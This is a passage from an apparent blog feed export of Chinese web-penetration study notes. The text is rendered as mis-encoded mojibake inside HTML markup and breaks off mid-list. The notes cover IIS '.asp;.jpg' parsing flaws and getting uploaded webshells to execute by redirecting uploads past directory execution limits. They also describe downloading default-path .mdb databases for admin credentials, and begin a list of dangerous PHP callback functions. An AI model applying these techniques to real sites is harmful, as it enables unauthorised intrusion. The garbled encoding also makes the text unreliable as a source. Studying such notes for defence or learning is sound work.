åŸºç¡€å…¥é—¨-æ­å»ºå®‰å…¨æ‹“å±•"></a>DAY3 åŸºç¡€å…¥é—¨-æ­å»ºå®‰å…¨æ‹“å±•</h2><h3 id="1-å¸¸è§æ­å»ºå¹³å°è„šæœ¬å¯ç”¨"><a href="#1-å¸¸è§æ­å»ºå¹³å°è„šæœ¬å¯ç”¨" class="headerlink" title="1.å¸¸è§æ­å»ºå¹³å°è„šæœ¬å¯ç”¨"></a>1.å¸¸è§æ­å»ºå¹³å°è„šæœ¬å¯ç”¨</h3><p><img src="/2022/07/21/xiaodi/image-20220725230825776.png" alt="image-20220725230825776"></p><h3 id="2-åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜"><a href="#2-åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜" class="headerlink" title="2.åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜"></a>2.åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜</h3><p><strong>åŸŸåè®¿é—®</strong>æ—¶ï¼ˆå¦‚<code>www.baidu.com</code>ï¼‰ä¸€èˆ¬æ˜¯<strong>æŒ‡å‘æŸä¸ªç‰¹å®šæ–‡ä»¶</strong>ï¼Œç”¨å·¥å…·æ‰«ææ—¶ï¼Œä¹Ÿåªèƒ½æ‰«æè¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><strong>IPè®¿é—®</strong>æ—¶å°±å¯ä»¥<strong>è®¿é—®åˆ°æ ¹ç›®å½•</strong>ï¼Œæ‰«ææ—¶å°±å¯èƒ½æ‰«æåˆ°è¯¥ç«™ç‚¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œç”šè‡³è¿˜æœ‰ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶</p><p><u>ä¸€èˆ¬æ˜¯IPå’ŒåŸŸååŒæ—¶ä½¿ç”¨</u></p><h3 id="3-å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨"><a href="#3-å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨" class="headerlink" title="3.å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨"></a>3.å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨</h3><p><img src="/2022/07/21/xiaodi/image-20220725210703706.png" alt="image-20220725210703706"></p><p>ä¸‹å›¾æ˜¯ï¼Œiisä¸­é—´ä»¶</p><p>æ‰©å±•åå¯¹åº”é…ç½®æ–‡ä»¶ï¼Œä½¿å¾—æœ‰è¯¥æ‰©å±•åçš„æ–‡ä»¶ä»¥é…ç½®æ–‡ä»¶å®šä¹‰çš„æ–¹å¼æ‰“å¼€æˆ–è¿è¡Œ</p><p>å¦‚ï¼Œæ·»åŠ ä¸€ä¸ªæ‰©å±•åä¸º.hahaï¼Œå¯¹åº”çš„é…ç½®æ–‡ä»¶å°±ä¸ºä¸‹å›¾çš„.aspæ‰©å±•åå¯¹åº”çš„é…ç½®æ–‡ä»¶ï¼Œè¿™æ ·æ‰“å¼€.hahaæ‰©å±•åçš„æ–‡ä»¶å°±ç›¸å½“äºæ‰“å¼€.aspç±»å‹çš„æ–‡ä»¶äº†</p><p>æ‰€ä»¥ï¼Œåˆ©ç”¨è¿™ä¸ªæœ‰æ—¶å€™æˆ‘ä»¬ä¸Šä¼ ä»¥ä¸ºæ­£ç¡®çš„æ–‡ä»¶æ‰©å±•åï¼Œä½†å´æ— æ³•ä»¥æˆ‘ä»¬æƒ³è¦çš„æ–¹å¼æ‰“å¼€æˆ–è€…ç”¨èšå‰‘ã€èœåˆ€ç­‰å·¥å…·è¿æ¥ï¼Œå°±å¯èƒ½æ˜¯ä¸­é—´ä»¶è§£æåè®®ä¿®æ”¹äº†æœ¬æ¥çš„æ‰©å±•å</p><p>å¦‚åˆ é™¤äº†.aspï¼Œåªä¿ç•™.hahaæ‰©å±•åï¼Œå¦‚æœä¸Šä¼ .aspæ‰©å±•åæ–‡ä»¶ï¼Œå°±ä¼šæ— æ•ˆï¼Œä½¿å¾—æˆ‘ä»¬å—é˜»ï¼Œåªæœ‰ä¸Šä¼ .hahaæ‰©å±•åæ–‡ä»¶æ‰å¯ä»¥è¢«è§†ä¸ºaspæ–‡ä»¶</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œåšä¸ªè¡¥å……ï¼Œï¼Œä¹‹å‰åšè¿‡ä¸€ä¸ªâ€œå†…éƒ¨æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿæ¼æ´åˆ†ææº¯æºâ€çš„é¢˜ï¼Œæåˆ°äº†iisä½ç‰ˆæœ¬è§£ææ¼æ´</span><br><span class="line"></span><br><span class="line">IISè§£ææ¼æ´åˆ†ä¸ºä¸¤ç§ï¼š</span><br><span class="line">ï¼ˆ1ï¼‰ä¸€ç§æ˜¯åœ¨ä»¥â€œ<span class="string">.asp</span>â€â€œ<span class="string">.asa</span>â€å‘½åçš„æ–‡ä»¶å¤¹å†…ï¼Œæ‰€æœ‰æ–‡ä»¶éƒ½ä»¥aspæ–‡ä»¶è¢«è§£æã€‚</span><br><span class="line">ï¼ˆ2ï¼‰ç¬¬äºŒç§æ˜¯IISçš„æ–‡ä»¶è§£æ,å½¢å¼ï¼š<span class="string">/xx.asp</span>;<span class="string">.jpg</span>ï¼ˆåˆ©â½¤ç‰¹æ®Šç¬¦å· <span class="string">&quot;;&quot;</span><span class="string">.xx.asp</span>;<span class="string">.jpg</span> è¢«è§£æä¸ºaspè„šæœ¬</span><br></pre></td></tr></table></figure><p><img src="/2022/07/21/xiaodi/image-20220725223658222.png" alt="image-20220725223658222"></p><h3 id="4-å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤"><a href="#4-å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤" class="headerlink" title="4.å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤"></a>4.å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤</h3><h4 id="1-æ‹’ç»åŒ¿åè®¿é—®"><a href="#1-æ‹’ç»åŒ¿åè®¿é—®" class="headerlink" title="1.æ‹’ç»åŒ¿åè®¿é—®"></a>1.æ‹’ç»åŒ¿åè®¿é—®</h4><p>è¿™æ ·æƒ³è¦è®¿é—®ç½‘ç«™é¡µé¢çš„æ—¶å€™ï¼Œå°±éœ€è¦è¾“å…¥é™å®šè´¦å·å’Œå¯†ç ï¼Œå¦åˆ™å°±æ— æ³•è¿›è¡Œè®¿é—®</p><h4 id="2-æ‹’ç»ä¸€å°ç”µè„‘æˆ–ä¸€ç»„ç”µè„‘çš„IPæˆ–åŸŸåé™åˆ¶ï¼ˆä¹Ÿæ˜¯IPåœ°å€é™åˆ¶ï¼‰"><a href="#2-æ‹’ç»ä¸€å°ç”µè„‘æˆ–ä¸€ç»„ç”µè„‘çš„IPæˆ–åŸŸåé™åˆ¶ï¼ˆä¹Ÿæ˜¯IPåœ°å€é™åˆ¶ï¼‰" class="headerlink" title="2.æ‹’ç»ä¸€å°ç”µè„‘æˆ–ä¸€ç»„ç”µè„‘çš„IPæˆ–åŸŸåé™åˆ¶ï¼ˆä¹Ÿæ˜¯IPåœ°å€é™åˆ¶ï¼‰"></a>2.æ‹’ç»ä¸€å°ç”µè„‘æˆ–ä¸€ç»„ç”µè„‘çš„IPæˆ–åŸŸåé™åˆ¶ï¼ˆä¹Ÿæ˜¯IPåœ°å€é™åˆ¶ï¼‰</h4><p>é€šè¿‡æ·»åŠ å¯¹æ–¹IPï¼Œæ¥å®ç°åœ¨IPå†…çš„æ‰€æœ‰è®¡ç®—æœºç½‘ç»œéƒ½æ— æ³•è®¿é—®è¯¥ç½‘ç«™</p><h3 id="5-WEBåé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™"><a href="#5-WEBåé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™" class="headerlink" title="5.WEBåé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™"></a>5.WEBåé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™</h3><p>åˆ©ç”¨èœåˆ€ç­‰å·¥å…·ï¼Œå¯ä»¥è¿æ¥åˆ°æœåŠ¡å™¨ä¸­çš„åé—¨ï¼Œä½†æ˜¯å¦‚æœæœåŠ¡å™¨ç«¯è®¾ç½®äº†å¯¹Internet æ¥å®¾ç”¨æˆ·çš„æƒé™æ—¶ï¼Œå°±ä¼šé‡åˆ°é˜»ç¢</p><p>å¦‚è®¾ç½®æ‹’ç»è¯»å–ï¼Œé‚£ä¹ˆèœåˆ€å°±æ— æ³•è¯»å–è¯¥æ–‡ä»¶å¤¹ä¸‹çš„å†…å®¹ï¼Œå°±åœ¨å‰é¢æåˆ°ç½‘ç«™çš„æ‹’ç»åŒ¿åè®¿é—®</p><p>å¦‚æœè®¾ç½®æ‹’ç»å†™å…¥ï¼Œé‚£ä¹ˆèœåˆ€å°±æ— æ³•åœ¨å…¶ä¸­æ–°å»ºæ–‡ä»¶</p><p>ä½†æ˜¯è¯¥ç½‘ç«™è¿™ä¸ªç›®å½•ä¸‹çš„ç½‘ç«™é¡µé¢ï¼Œä¹Ÿæ— æ³•æ­£å¸¸è®¿é—®</p><p><img src="/2022/07/21/xiaodi/image-20220726110555183.png" alt="image-20220726110555183"></p><p>ä¸‹å›¾ä¸ºç½‘ç«™ä¸ç»™æ‰§è¡Œæƒé™ï¼Œä¹Ÿå°±æ˜¯é‡Œé¢çš„æ–‡ä»¶éƒ½æ— æ³•æ‰§è¡Œï¼Œè¿™æ ·æ— è®ºæ˜¯è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„æœ¨é©¬ï¼Œè¿˜æ˜¯èœåˆ€è¯•ç€è¿æ¥æœ¨é©¬ï¼Œéƒ½ä¸è¡Œï¼Œä»¥å› ä¸ºæ²¡æœ‰äº†æ‰§è¡Œæƒé™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†™çš„ä¸€å¥è¯æœ¨é©¬çš„ä»£ç ä¹Ÿå‘æŒ¥ä¸äº†ä½œç”¨</p><p>è¿™ä¹Ÿæ˜¯å®æˆ˜ä¸­ä¸ºä»€ä¹ˆä¼šè¿™ä¹ˆå›°éš¾å’Œå¤æ‚</p><p><u><strong>é‚£ä¹ˆä¸€èˆ¬å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ</strong></u></p><p>æˆ‘ä»¬å¯ä»¥è¯•è¯•æ¢ä¸€ä¸ªç›®å½•ï¼Œä¸€èˆ¬è¿™ç§é™åˆ¶æœ€å¯èƒ½åœ¨ä¾‹å¦‚uploadè¿™ç§ç›®å½•ï¼Œä½†æ˜¯imgè¿™ç±»å›¾ç‰‡ç›®å½•ä¸‹ï¼Œå¸¸ç†è€Œè¨€æ˜¯æ²¡æœ‰è„šæœ¬æ–‡ä»¶ï¼Œæ‰€ä»¥å¾ˆæœ‰å¯èƒ½æ˜¯æ²¡æœ‰åŠ ä»¥é™åˆ¶çš„ï¼Œæ‰€ä»¥åœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥è¯•è¯•æŠ“åŒ…ç„¶åä¿®æ”¹æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•ï¼Œä»è€Œä½¿å¾—è„šæœ¬å¯ä»¥æ­£å¸¸æ‰§è¡Œå’Œä¸å·¥å…·è¿æ¥</p><p>ä¸€èˆ¬æ€è·¯å°±æ˜¯æŠŠè„šæœ¬æ–‡ä»¶åŠªåŠ›ä¸Šä¼ åˆ°æœ€å¯èƒ½æ²¡æœ‰é™åˆ¶çš„ç›®å½•ä¸‹ï¼Œæ¯”å¦‚<u>æ ¹ç›®å½•</u>ï¼Œæˆ–è€…<u>ç½‘ç«™è‡ªèº«çš„è„šæœ¬ç›®å½•</u>ï¼ˆå› ä¸ºå®ƒè‡ªèº«å¯èƒ½ä¹Ÿéœ€è¦è¿è¡Œå®ƒè‡ªå·±çš„è„šæœ¬ï¼Œæ‰€ä»¥å¤§æ¦‚ç‡ä¸å¯èƒ½åœ¨é‚£ä¸ªç›®å½•ä¸‹åŠ ä¸Šæƒé™ï¼Œè¿™æ ·å®ƒè‡ªå·±ä¹Ÿæ— æ³•æ­£å¸¸è¿è¡Œäº†ï¼‰</p><p><img src="/2022/07/21/xiaodi/image-20220726110523557.png" alt="image-20220726110523557"></p><h3 id="6-ç½‘ç«™æºç è„šæœ¬æ ¼å¼"><a href="#6-ç½‘ç«™æºç è„šæœ¬æ ¼å¼" class="headerlink" title="6.ç½‘ç«™æºç è„šæœ¬æ ¼å¼"></a>6.ç½‘ç«™æºç è„šæœ¬æ ¼å¼</h3><p><code>ä¸€èˆ¬å¯ä»¥æ ¹æ®æ•°æ®åº“ç±»å‹ï¼Œæˆ–è€…ç½‘ç«™æ­å»ºçš„ä¸­é—´ä»¶å¹³å°åŠ ä»¥æ¨å¯¼</code></p><h4 id="1-çŸ¥é“æ•°æ®åº“ç±»å‹"><a href="#1-çŸ¥é“æ•°æ®åº“ç±»å‹" class="headerlink" title="1.çŸ¥é“æ•°æ®åº“ç±»å‹"></a>1.çŸ¥é“æ•°æ®åº“ç±»å‹</h4><p>mysqlæ•°æ®åº“ä¸€èˆ¬æ˜¯phpè„šæœ¬</p><p>sqlserveræ•°æ®åº“ä¸€èˆ¬æ˜¯aspæˆ–aspxè„šæœ¬</p><p>oracleæ•°æ®åº“ä¸€èˆ¬æ˜¯pythonè„šæœ¬</p><h4 id="2-çŸ¥é“ä¸­é—´ä»¶"><a href="#2-çŸ¥é“ä¸­é—´ä»¶" class="headerlink" title="2.çŸ¥é“ä¸­é—´ä»¶"></a>2.çŸ¥é“ä¸­é—´ä»¶</h4><p>iisä¸€èˆ¬ç”¨aspæˆ–aspx</p><p>apacheä¸€èˆ¬phpè„šæœ¬å±…å¤š</p><p>tomcatä¸€èˆ¬jspè„šæœ¬</p><p>å¦‚æœåˆ¤æ–­ä¸å‡ºç½‘ç«™çš„æºç è„šæœ¬æ–‡ä»¶ï¼Œ</p><p>å¯èƒ½ç½‘ç«™åšäº†ä¼ªé™æ€ï¼Œé‚£ä¹ˆåœ¨è„šæœ¬ç±»å‹ä¸ä¼šåœ¨ç½‘ç«™åœ°å€ä¸‹å»ä½“ç°ï¼Œä½†æ˜¯ç”¨<u><strong>æ‰«æå·¥å…·</strong></u>å¯ä»¥æ›´åŠ æ·±å…¥çš„çˆ¬å¯»æ–‡ä»¶</p><p>è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•å°±æ˜¯åœ¨<u><strong>è°·æ­Œæœç´¢å¼•æ“</strong></u>ä¸Šçœ‹çœ‹æœ‰æ²¡æœ‰è¯¥ç½‘ç«™çš„å¿«ç…§ä¿¡æ¯ï¼Œæœ‰å¿«ç…§ä¿¡æ¯å°±å¯ä»¥é’ˆå¯¹æ€§çš„ç”¨å…³é”®è¯ç­›é€‰ä¸€ä¸‹ï¼Œçœ‹æœ‰æ²¡æœ‰è„šæœ¬è¿è¡Œä¿¡æ¯å‡ºç°</p><p>è¿˜æœ‰å°±æ˜¯å¯ä»¥<u><strong>æŠ“ç½‘ç«™çš„æ•°æ®åŒ…</strong></u>ï¼Œçœ‹çœ‹æ•°æ®åŒ…é‡Œï¼Œä¸€èˆ¬çš„å¦‚æœæ•°æ®åŒ…çš„å†™æ³•ä¸åŒï¼Œé‡Œé¢çš„cookieå€¼å°±ä¼šæœ‰æ‰€ä¸åŒï¼Œæ¯”å¦‚phpsession,jspsessionï¼Œå°±å¯ä»¥æ ¹æ®å‰ç¼€çŸ¥é“æ˜¯ä»€ä¹ˆç±»å‹çš„è„šæœ¬æ–‡ä»¶ ï¼Œå¦‚æœéƒ½ä¸æ˜¯å¯èƒ½å°±æ˜¯aspæˆ–aspx</p><hr><h2 id="DAY4-åŸºç¡€å…¥é—¨-WEBæºç æ‹“å±•"><a href="#DAY4-åŸºç¡€å…¥é—¨-WEBæºç æ‹“å±•" class="headerlink" title="DAY4 åŸºç¡€å…¥é—¨-WEBæºç æ‹“å±•"></a>DAY4 åŸºç¡€å…¥é—¨-WEBæºç æ‹“å±•</h2><p><img src="/2022/07/21/xiaodi/image-20220727150617311.png" alt="image-20220727150617311"></p><p><img src="/2022/07/21/xiaodi/image-20220727150829672.png" alt="image-20220727150829672"></p><h3 id="1-ç½‘ç«™æºç æ–‡ä»¶ç›®å½•"><a href="#1-ç½‘ç«™æºç æ–‡ä»¶ç›®å½•" class="headerlink" title="1.ç½‘ç«™æºç æ–‡ä»¶ç›®å½•"></a>1.ç½‘ç«™æºç æ–‡ä»¶ç›®å½•</h3><p><code>admin</code>ï¼šåå°æ–‡ä»¶ç›®å½•</p><p><code>data</code>ï¼šæ•°æ®ç›¸å…³ï¼Œå¯èƒ½æœ‰æ•°æ®åº“é…ç½®æ–‡ä»¶ã€å¯èƒ½ç›´æ¥è¿æ¥åˆ°å¯¹æ–¹çš„æ•°æ®åº“è·å¾—å¯¹æ–¹çš„æ•°æ®åº“ä¿¡æ¯ã€‘</p><p><code>include</code>ï¼šæ•°æ®åº“ç›®å½•</p><p><code>template</code>ï¼šç½‘ç«™æ¨¡æ¿æ–‡ä»¶,å’Œç½‘ç«™ç•Œé¢ç›¸å…³ï¼Œä¼˜åŒ–ç½‘ç«™æ¶æ„ã€(è‰¹çš¿è‰¹ )æƒ³èµ·å­¦sstiæ¼æ´ï¼Œçœ‹äº†å¥½å‡ å¤©æ–‡ç« ã€‘</p><h3 id="2-ASPï¼ŒPHPï¼ŒASPï¼ŒJSPï¼ŒJAVAWEBç­‰è„šæœ¬ç±»å‹å®‰å…¨é—®é¢˜"><a href="#2-ASPï¼ŒPHPï¼ŒASPï¼ŒJSPï¼ŒJAVAWEBç­‰è„šæœ¬ç±»å‹å®‰å…¨é—®é¢˜" class="headerlink" title="2.ASPï¼ŒPHPï¼ŒASPï¼ŒJSPï¼ŒJAVAWEBç­‰è„šæœ¬ç±»å‹å®‰å…¨é—®é¢˜"></a>2.ASPï¼ŒPHPï¼ŒASPï¼ŒJSPï¼ŒJAVAWEBç­‰è„šæœ¬ç±»å‹å®‰å…¨é—®é¢˜</h3><p>å¯ä»¥åœ¨è¿™ä¸ªç½‘ç«™ä¸Šçœ‹çœ‹è„šæœ¬è¯­è¨€ç±»å‹</p><p><code>https://websec.readthedocs.io/zh/latest/language/index.html</code></p><p>å½“çœ‹åˆ°ç½‘ç«™çš„è„šæœ¬æ ¼å¼æ—¶ï¼Œå°±å¤§è‡´å¯ä»¥çŒœæµ‹åˆ°å¤§æ¦‚å®¹æ˜“å‡ºç°ä»€ä¹ˆæ¼æ´ï¼Œ</p><p>å› ä¸ºç½‘ç«™æºç è¯­è¨€å’Œåº”ç”¨ä¸åŒï¼Œç¼–å†™çš„æ–¹å¼ä¹Ÿä¸åŒï¼Œå‡ºç°çš„é—®é¢˜ä¹Ÿå°±ä¸åŒï¼Œä»è€Œé’ˆå¯¹æ€§çš„å¯»æ‰¾æˆ–ä¿®å¤æ¼æ´ï¼ŒèŠ‚çº¦æ—¶é—´ï¼Œæé«˜æ•ˆç‡</p><h3 id="3-ç¤¾äº¤ï¼Œè®ºå›ï¼Œé—¨æˆ·ï¼Œç¬¬ä¸‰æ–¹ï¼Œåšå®¢ç­‰ä¸åŒä»£ç æœºåˆ¶å¯¹åº”æ¼æ´"><a href="#3-ç¤¾äº¤ï¼Œè®ºå›ï¼Œé—¨æˆ·ï¼Œç¬¬ä¸‰æ–¹ï¼Œåšå®¢ç­‰ä¸åŒä»£ç æœºåˆ¶å¯¹åº”æ¼æ´" class="headerlink" title="3.ç¤¾äº¤ï¼Œè®ºå›ï¼Œé—¨æˆ·ï¼Œç¬¬ä¸‰æ–¹ï¼Œåšå®¢ç­‰ä¸åŒä»£ç æœºåˆ¶å¯¹åº”æ¼æ´"></a>3.ç¤¾äº¤ï¼Œè®ºå›ï¼Œé—¨æˆ·ï¼Œç¬¬ä¸‰æ–¹ï¼Œåšå®¢ç­‰ä¸åŒä»£ç æœºåˆ¶å¯¹åº”æ¼æ´</h3><h3 id="4-å¼€æºï¼Œæœªå¼€æºé—®é¢˜ï¼Œæ¡†æ¶éæ¡†æ¶é—®é¢˜ï¼Œå…³äºCMSè¯†åˆ«é—®é¢˜åŠåç»­ç­‰"><a href="#4-å¼€æºï¼Œæœªå¼€æºé—®é¢˜ï¼Œæ¡†æ¶éæ¡†æ¶é—®é¢˜ï¼Œå…³äºCMSè¯†åˆ«é—®é¢˜åŠåç»­ç­‰" class="headerlink" title="4.å¼€æºï¼Œæœªå¼€æºé—®é¢˜ï¼Œæ¡†æ¶éæ¡†æ¶é—®é¢˜ï¼Œå…³äºCMSè¯†åˆ«é—®é¢˜åŠåç»­ç­‰"></a>4.å¼€æºï¼Œæœªå¼€æºé—®é¢˜ï¼Œæ¡†æ¶éæ¡†æ¶é—®é¢˜ï¼Œå…³äºCMSè¯†åˆ«é—®é¢˜åŠåç»­ç­‰</h3><p>CMSï¼šå†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆcontent management systemï¼ŒCMSï¼‰ï¼Œæ˜¯ä¸€ç§ä½äºWEBå‰ç«¯ï¼ˆWeb  æœåŠ¡å™¨ï¼‰å’Œåç«¯åŠå…¬ç³»ç»Ÿæˆ–æµç¨‹ï¼ˆå†…å®¹åˆ›ä½œã€ç¼–è¾‘ï¼‰ä¹‹é—´çš„è½¯ä»¶ç³»ç»Ÿã€‚å†…å®¹çš„åˆ›ä½œäººå‘˜ã€ç¼–è¾‘äººå‘˜ã€å‘å¸ƒäººå‘˜ä½¿ç”¨å†…å®¹ç®¡ç†ç³»ç»Ÿæ¥æäº¤ã€ä¿®æ”¹ã€å®¡æ‰¹ã€å‘å¸ƒå†…å®¹ã€‚è¿™é‡ŒæŒ‡çš„â€œå†…å®¹â€å¯èƒ½åŒ…æ‹¬æ–‡ä»¶ã€è¡¨æ ¼ã€å›¾ç‰‡ã€æ•°æ®åº“ä¸­çš„æ•°æ®ç”šè‡³è§†é¢‘ç­‰ä¸€åˆ‡ä½ æƒ³è¦å‘å¸ƒåˆ°Internetã€<a href="https://baike.baidu.com/item/Intranet/3247037">Intranet</a>ä»¥åŠ<a href="https://baike.baidu.com/item/Extranet/10579301">Extranet</a>ç½‘ç«™çš„ä¿¡æ¯ã€‚</p><h3 id="5-å…³äºæºç è·å–ç›¸å…³é€”å¾„"><a href="#5-å…³äºæºç è·å–ç›¸å…³é€”å¾„" class="headerlink" title="5.å…³äºæºç è·å–ç›¸å…³é€”å¾„"></a>5.å…³äºæºç è·å–ç›¸å…³é€”å¾„</h3><p>æœç´¢ï¼Œå’¸é±¼æ·˜å®ï¼Œç¬¬ä¸‰æ–¹æºç ç«™ï¼Œå„ç§è¡Œä¸šå¯¹åº”ï¼Œä¸€äº›æºç å¯èƒ½å°±å¯ä»¥æ‰¾åˆ°æºç ï¼Œä½†ä¸€èˆ¬æ˜¯å¤§ä¼—å‹çš„ï¼Œè€Œä¸€äº›å°å‹ï¼ˆæˆ–è€…ç°è‰²çš„ç½‘ç«™ï¼‰ç½‘ç«™å¯èƒ½æœä¸åˆ°çš„ï¼Œå’¸é±¼ç­‰ä¸€äº›ç¬¬ä¸‰æ–¹æºç å¯èƒ½æ‰¾åˆ°çš„</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="#æ€»ç»“"></a>#æ€»ç»“</h3><p>å…³æ³¨åº”ç”¨åˆ†ç±»åŠè„šæœ¬ç±»å‹ä¼°æ‘¸å‡ºå¯èƒ½å­˜åœ¨çš„æ¼æ´(å…¶ä¸­æ¡†æ¶ç±»ä¾‹å¤–)ï¼Œåœ¨è·å–æºç åå¯è¿›è¡Œæœ¬åœ°å®‰å…¨æµ‹è¯•æˆ–ä»£ç å®¡è®¡ï¼Œä¹Ÿå¯ä»¥åˆ†æå…¶ç›®å½•å·¥ä½œåŸç†(æ•°æ®åº“å¤‡ä»½ï¼Œbakæ–‡ä»¶ç­‰)ï¼Œæœªè·å–åˆ°çš„æºç é‡‡ç”¨å„ç§æ–¹æ³•æƒ³åŠæ³•è·å–!</p><hr><h3 id="aspç½‘ç«™"><a href="#aspç½‘ç«™" class="headerlink" title="aspç½‘ç«™"></a>aspç½‘ç«™</h3><p>æœ‰ä¸€ä¸ª<code>mdb</code>æ–‡ä»¶ã€è¡¨æ ¼æ–‡ä»¶ã€‘ï¼Œå­˜æ”¾æ•°æ®ï¼Œç›¸å½“äºæ•°æ®åº“ï¼Œåå°çš„è´¦å·å¯†ç ä¸€èˆ¬åœ¨ä¸Šé¢</p><p>å¦‚æœç½‘ç«™æ˜¯ç›´æ¥å¥—ç”¨çš„ç½‘ç«™æºç ç»“æ„ï¼Œæ²¡æœ‰è¿›è¡Œä¿®æ”¹ï¼Œå…¶ä¸­å°±åŒ…æ‹¬æ•°æ®åº“è·¯å¾„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•æŠŠæ•°æ®åº“çš„è·¯å¾„é˜²æ­¢ç‰©è”ç½‘ç½‘ä¸Šå°è¯•ä¸‹è½½ã€ä¸€èˆ¬æ˜¯è¿›è¡Œè¿‡æ»¤äº†ï¼Œå‡ ä¹ä¸å¯èƒ½ä¸‹è½½æˆåŠŸã€‘ï¼Œ</p><p>æ¯”å¦‚çŸ¥é“<code>www.hahaha.com</code>è¿™ä¸ªç½‘ç«™çš„æ•°æ®åº“åœ¨<code>/admin/schema/</code>è¿™ä¸ªè·¯å¾„é‡Œï¼Œæ•°æ®åº“æ–‡ä»¶åä¸º<code>flag.mdb</code></p><p>é‚£æˆ‘ä»¬è®¿é—®<code>www.hahaha.com/admin/schema/flag.mdb</code>å°±å¯èƒ½ä¸‹è½½ä¸‹æ¥æ•°æ®åº“æ–‡ä»¶ï¼ŒæŸ¥çœ‹é‡Œé¢çš„åå°çš„è´¦å·å’Œå¯†ç ã€å¯†ç ä¸€èˆ¬åŠ å¯†äº†çš„(md5)ã€‘</p><h3 id="phpç½‘ç«™"><a href="#phpç½‘ç«™" class="headerlink" title="phpç½‘ç«™"></a>phpç½‘ç«™</h3>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»£ç å®¡è®¡çŸ¥è¯†ç‚¹è®°å½•</title>
      <link href="/2022/06/26/Code-audit/"/>
      <url>/2022/06/26/Code-audit/</url>
      
        <content type="html"><![CDATA[<p><code>ä»£ç å®¡è®¡å­¦ä¹ çš„ä¸€äº›ç¬”è®°</code></p><span id="more"></span><h1 id="ä»£ç å®¡è®¡-å¸¸è§phpå¨èƒå‡½æ•°ï¼ˆä¸Šï¼‰"><a href="#ä»£ç å®¡è®¡-å¸¸è§phpå¨èƒå‡½æ•°ï¼ˆä¸Šï¼‰" class="headerlink" title="ä»£ç å®¡è®¡-å¸¸è§phpå¨èƒå‡½æ•°ï¼ˆä¸Šï¼‰"></a>ä»£ç å®¡è®¡-å¸¸è§phpå¨èƒå‡½æ•°ï¼ˆä¸Šï¼‰</h1><blockquote><p>æ–‡ç« æ¥è‡ª<a href="https://baijiahao.baidu.com/s?id=1715285716686081123&wfr=spider&for=pc">æˆéƒ½çŸ¥é“åˆ›å®‡</a></p></blockquote><h2 id="1-å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤-x2F-ä»£ç æ‰§è¡Œå‡½æ•°"><a href="#1-å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤-x2F-ä»£ç æ‰§è¡Œå‡½æ•°" class="headerlink" title="1.å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤&#x2F;ä»£ç æ‰§è¡Œå‡½æ•°"></a>1.å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤&#x2F;ä»£ç æ‰§è¡Œå‡½æ•°</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">call_user_func</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">call_user_func_array</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">create_function</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array_walk</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array_map</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array_filter</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">usort</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">ob_start</span><span 